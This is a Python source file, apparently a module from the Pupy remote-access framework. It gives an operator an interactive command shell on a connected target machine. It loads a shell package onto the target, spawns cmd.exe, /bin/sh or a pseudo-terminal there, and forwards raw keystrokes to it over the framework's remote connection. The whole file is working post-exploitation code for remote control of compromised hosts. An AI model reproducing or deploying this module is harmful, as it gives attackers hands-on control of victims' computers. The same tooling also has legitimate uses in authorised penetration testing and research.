# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import redirected_stdio
import sys
import os
import termios
import tty
import select
import time
import StringIO
from threading import Event

__class_name__="InteractiveShell"
def print_callback(data):
	sys.stdout.write(data)
	sys.stdout.flush()

class InteractiveShell(PupyModule):
	"""
		open an interactive command shell. tty are well handled for targets running *nix
	"""
	max_clients=1
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(description=self.__doc__)
		self.arg_parser.add_argument('-T', action='store_true', dest='pseudo_tty', help="Disable tty allocation")
		self.arg_parser.add_argument('program', nargs='?', help="open a specific program. Default for windows is cmd.exe and for linux it depends on the remote SHELL env var")

	def run(self, args):
		if self.client.is_windows() or args.pseudo_tty:
			self.client.load_package("interactive_shell")
			encoding=None
			program="/bin/sh"
			if self.client.is_windows():
				program="cmd.exe"
				encoding="cp437"
			if args.program:
				program=args.program
			with redirected_stdio(self.client.conn):
				self.client.conn.modules.interactive_shell.interactive_open(program=program, encoding=encoding)
		else: #handling tty
			self.client.load_package("ptyshell")
			ps=self.client.conn.modules['ptyshell'].PtyShell()
			program=None
			if args.program:
				program=args.program.split()
			ps.spawn(program)
			is_closed=Event()
			ps.start_read_loop(print_callback, is_closed.set)
			try:
				fd=sys.stdin.fileno()
				f=os.fdopen(fd,'r')
				old_settings = termios.tcgetattr(fd)
				try:
					tty.setraw(fd)
					input_buf=b""
					while True:
						r, w, x = select.select([sys.stdin], [], [], 0)
						if sys.stdin in r:
							input_buf+=sys.stdin.read(1)
						elif input_buf:
							ps.write(input_buf)
							input_buf=b""
						elif is_closed.is_set():
							break
						else:
							time.sleep(0.01)
				finally:
					termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
			finally:
				ps.close()


